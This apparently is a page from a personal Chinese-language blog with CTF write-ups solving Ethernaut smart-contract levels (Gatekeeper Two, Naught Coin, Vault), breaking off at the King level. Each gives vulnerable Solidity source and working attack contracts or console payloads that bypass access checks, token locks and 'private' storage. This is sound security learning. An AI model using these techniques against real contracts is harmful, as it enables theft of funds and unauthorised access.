<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"qst137.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="苍山岁岁有人去，唯愿洱海生白波。">
<meta property="og:type" content="website">
<meta property="og:title" content="QST2&#39;s BLOG">
<meta property="og:url" content="https://qst137.github.io/page/2/index.html">
<meta property="og:site_name" content="QST2&#39;s BLOG">
<meta property="og:description" content="苍山岁岁有人去，唯愿洱海生白波。">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="QST137">
<meta property="article:tag" content="CyberSecurity">
<meta property="article:tag" content="Blockchain">
<meta property="article:tag" content="ChinaRock">
<meta property="article:tag" content="SexWithLove">
<meta property="article:tag" content="Chiikawa">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://qst137.github.io/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>QST2's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">QST2's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Version: WwJ</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/04/2024-09-04-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/04/2024-09-04-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%81/" class="post-title-link" itemprop="url">区块链学习之叁</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-04 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-04T00:00:00+08:00">2024-09-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-19 21:17:26" itemprop="dateModified" datetime="2024-09-19T21:17:26+08:00">2024-09-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="区块链学习之叁"><a href="#区块链学习之叁" class="headerlink" title="区块链学习之叁"></a>区块链学习之叁</h1><p>损耗送：纵欲也是修行的一种，水木之气先行；</p>
<h2 id="ethernaut-Gatekeeper-Two"><a href="#ethernaut-Gatekeeper-Two" class="headerlink" title="ethernaut - Gatekeeper Two"></a>ethernaut - Gatekeeper Two</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</span><br><span class="line"></span><br><span class="line">// Things that might help:</span><br><span class="line">// Remember what you&#x27;ve learned from getting past the first gatekeeper - the first gate is the same.</span><br><span class="line">// The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See Solidity Assembly for more information. The extcodesize call in this gate will get the size of a contract&#x27;s code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.</span><br><span class="line">// The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see Solidity cheatsheet). The Coin Flip level is also a good place to start when approaching this challenge.</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            x := extcodesize(caller())</span><br><span class="line">        &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接看<code>gateTwo()</code>；</p>
<p>乍一看<code>gateOne()</code>与<code>gateTwo()</code>好像冲突，因为<code>gateOne()</code>要求用第三方合约调用函数，而<code>gateTwo()</code>要求<code>caller()</code>（等价于<code>msg.sender</code>）没有代码；</p>
<p>只有不存在的合约和钱包合约是没有代码的；</p>
<p>然而，在合约构造函数执行过程中，<code>caller()</code>是还没有被部署到目标 block 上的，此时调用<code>extcodesize(caller())</code>就可以得到<code>0</code>，因此可以在构造函数中调用<code>enter()</code>成功绕过<code>gateTwo()</code>；</p>
<p>再看<code>gateThree()</code>，一个异或，能 pass 的<code>_gatekey</code>值应当是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max</span><br></pre></td></tr></table></figure>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><strong>attack contract</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoAttack &#123;</span><br><span class="line">    constructor(address _victim) &#123;</span><br><span class="line">        bytes8 gatekey;</span><br><span class="line">        gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);</span><br><span class="line">        _victim.call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, gatekey));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署即可；</p>
<h2 id="ethernaut-Naught-Coin"><a href="#ethernaut-Naught-Coin" class="headerlink" title="ethernaut - Naught Coin"></a>ethernaut - Naught Coin</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// NaughtCoin is an ERC20 token and you&#x27;re already holding all of them. The catch is that you&#x27;ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</span><br><span class="line"></span><br><span class="line">//   Things that might help</span><br><span class="line"></span><br><span class="line">// The ERC20 Spec</span><br><span class="line">// The OpenZeppelin codebase</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.0.2/contracts/token/ERC20/ERC20.sol"><strong>ERC20</strong></a> 标准定义了以上合约；</p>
<p><code>lockTokens()</code> 这个 modifer 决定自合约被部署的开始往后十年内，<code>transfer</code> 函数对 <code>player</code> 禁用；</p>
<p>查看 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v5.0.2/contracts/token/ERC20/ERC20.sol"><strong>ERC20</strong></a> ，发现可以用另外一个函数<code>transferFrom()</code>进行转账操作，看一下这个函数有哪些限制： </p>
<p><strong>part of ERC20 source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">   function transferFrom(address from, address to, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">       address spender = _msgSender();</span><br><span class="line">       _spendAllowance(from, spender, value);</span><br><span class="line">       _transfer(from, to, value);</span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   // 消耗 Allowance ， Allowance 是什么 ？</span><br><span class="line">   function _spendAllowance(address owner, address spender, uint256 value) internal virtual &#123;</span><br><span class="line">       uint256 currentAllowance = allowance(owner, spender);</span><br><span class="line">       if (currentAllowance != type(uint256).max) &#123;</span><br><span class="line">           if (currentAllowance &lt; value) &#123;</span><br><span class="line">               revert ERC20InsufficientAllowance(spender, currentAllowance, value);</span><br><span class="line">           &#125;</span><br><span class="line">           unchecked &#123;</span><br><span class="line">               _approve(owner, spender, currentAllowance - value, false);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   // 查询 allowances ，猜测 allowances 是 owner 给 spender 的额度？</span><br><span class="line">   function allowance(address owner, address spender) public view virtual returns (uint256) &#123;</span><br><span class="line">       return _allowances[owner][spender];</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">// 定义</span><br><span class="line">mapping(address account =&gt; mapping(address spender =&gt; uint256)) private _allowances;</span><br><span class="line">   </span><br><span class="line">  	// 可以修改 _allowances ，看看对外函数</span><br><span class="line">   function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual &#123;</span><br><span class="line">       if (owner == address(0)) &#123;</span><br><span class="line">           revert ERC20InvalidApprover(address(0));</span><br><span class="line">       &#125;</span><br><span class="line">       if (spender == address(0)) &#123;</span><br><span class="line">           revert ERC20InvalidSpender(address(0));</span><br><span class="line">       &#125;</span><br><span class="line">       _allowances[owner][spender] = value;</span><br><span class="line">       if (emitEvent) &#123;</span><br><span class="line">           emit Approval(owner, spender, value);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   // 猜测正确</span><br><span class="line">   function approve(address spender, uint256 value) public virtual returns (bool) &#123;</span><br><span class="line">       address owner = _msgSender();</span><br><span class="line">       _approve(owner, spender, value);</span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   // 执行转账，更新余额</span><br><span class="line">       function _transfer(address from, address to, uint256 value) internal &#123;</span><br><span class="line">       if (from == address(0)) &#123;</span><br><span class="line">           revert ERC20InvalidSender(address(0));</span><br><span class="line">       &#125;</span><br><span class="line">       if (to == address(0)) &#123;</span><br><span class="line">           revert ERC20InvalidReceiver(address(0));</span><br><span class="line">       &#125;</span><br><span class="line">       _update(from, to, value);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>所以可以先用<code>player</code>调<code>approve()</code>把所有额度给第三个合约，然后再用第三方合约调<code>transferFrom()</code>把<code>balance()</code>悉数转出去； </p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><strong>approve</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意这个控制台操作传字符串，大数 js 处理不动</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(<span class="string">&#x27;0x142bB6fE56436bcB1DA7788AceB35b34899ea3C2&#x27;</span>,<span class="string">&#x27;1000000000000000000000000&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>attack contract (0x142bB6fE56436bcB1DA7788AceB35b34899ea3C2)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract NaughtCoinAttack&#123;</span><br><span class="line">    address private player;</span><br><span class="line">    address private instant;</span><br><span class="line"></span><br><span class="line">    event log(bool);</span><br><span class="line"></span><br><span class="line">    constructor(address _player,address _instant) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        instant = _instant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp() public &#123;</span><br><span class="line">        bytes memory data;</span><br><span class="line">        (, data)=instant.call(abi.encodeWithSignature(&quot;balanceOf(address)&quot;,player));</span><br><span class="line">        uint256 balance = abi.decode(data, (uint256));</span><br><span class="line">        (bool success, ) =  instant.call(abi.encodeWithSignature(&quot;transferFrom(address, address, uint256)&quot;, player, address(this), balance));</span><br><span class="line">        emit log(success);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="莫"><a href="#莫" class="headerlink" title="莫"></a>莫</h2><p>只肖数日便忘掉了人生的所有伤痛，就好像它们未曾来过。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://qst137.github.io/2024/09/03/2024-09-03-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B4%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="QST137">
      <meta itemprop="description" content="苍山岁岁有人去，唯愿洱海生白波。">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QST2's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/09/03/2024-09-03-%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B4%B0/" class="post-title-link" itemprop="url">区块链学习之贰</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-09-03 00:00:00" itemprop="dateCreated datePublished" datetime="2024-09-03T00:00:00+08:00">2024-09-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-19 21:15:54" itemprop="dateModified" datetime="2024-09-19T21:15:54+08:00">2024-09-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="区块链学习之贰"><a href="#区块链学习之贰" class="headerlink" title="区块链学习之贰"></a>区块链学习之贰</h1><p>逐渐硬核起来了；</p>
<h2 id="ethernaut-Vault"><a href="#ethernaut-Vault" class="headerlink" title="ethernaut - Vault"></a>ethernaut - Vault</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// Unlock the vault to pass the level!</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">    bool public locked;</span><br><span class="line">    bytes32 private password;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) &#123;</span><br><span class="line">        locked = true;</span><br><span class="line">        password = _password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes32 _password) public &#123;</span><br><span class="line">        if (password == _password) &#123;</span><br><span class="line">            locked = false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>区块链上数据都是透明的，<code>private</code>变量可读。</p>
<h3 id="区块链上变量的存储"><a href="#区块链上变量的存储" class="headerlink" title="区块链上变量的存储"></a>区块链上变量的存储</h3><p>从第一个变量开始，从右往左存储，试图填满一个插槽（32字节），遇到该插槽剩余空间不够的，转向下一个插槽；</p>
<p>读取时使用：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(address,slotID);</span><br></pre></td></tr></table></figure>

<h4 id="变长数组的存储方式"><a href="#变长数组的存储方式" class="headerlink" title="变长数组的存储方式"></a>变长数组的存储方式</h4><p>变长数组，由于存储时无法确定要占用多少<code>storage</code>，所以采取一种特殊的存储方式：</p>
<ol>
<li><p>占用一个 slot 来存储变长数组的长度，该 slot 的编号记作 n ；</p>
</li>
<li><p>存储的 slot 编号为：<code>SHA3(n)+i</code>，i 根据存储需要可以增加；</p>
</li>
<li><p>slot 实际值为 <code>SHA3(slot编号)</code>；</p>
</li>
</ol>
<p>以上；</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>得到密码即可，<code>bytes32</code>独占一个 slot 。</p>
<p><strong>payload</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0x1</span>);</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&#x27;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>甚至可以用<code>getStorageAt()</code>读一下<code>locked</code>，即使它是<code>public</code>的；</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0x0</span>);</span><br></pre></td></tr></table></figure>

<p><code>locked</code>是<code>false</code>了；</p>
<h3 id="长进"><a href="#长进" class="headerlink" title="长进"></a>长进</h3><p>读变量可以形成一个习惯，全用<code>getStorageAt()</code>去读；</p>
<h2 id="ethernaut-King"><a href="#ethernaut-King" class="headerlink" title="ethernaut - King"></a>ethernaut - King</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD</span><br><span class="line"></span><br><span class="line">// Such a fun game. Your goal is to break it.</span><br><span class="line"></span><br><span class="line">// When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</span><br></pre></td></tr></table></figure>

<p>交钱获取王位，并避免你的对手在你<code>submit</code>的时候夺回王位；</p>
<p><strong>source</strong></p>
